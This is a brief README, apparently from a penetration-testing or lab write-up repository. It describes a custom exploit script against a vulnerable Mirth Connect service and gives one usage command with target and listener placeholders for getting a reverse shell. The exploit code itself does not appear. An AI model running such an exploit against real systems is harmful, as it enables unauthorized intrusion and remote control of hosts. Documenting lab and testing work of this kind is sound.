# Useful Files

This directory contains supporting files used during the exploitation phase.

## Contents

- **mirthconnect_exploit.py**
  - Custom exploit script used to gain initial access to the target
  - Targets the vulnerable Mirth Connect service
  - Used to obtain a reverse shell on the system

## Usage

```bash
python3 mirthconnect_exploit.py -t <TARGET_IP> -p 443 -lh <YOUR_IP> -lp <PORT> --exploit
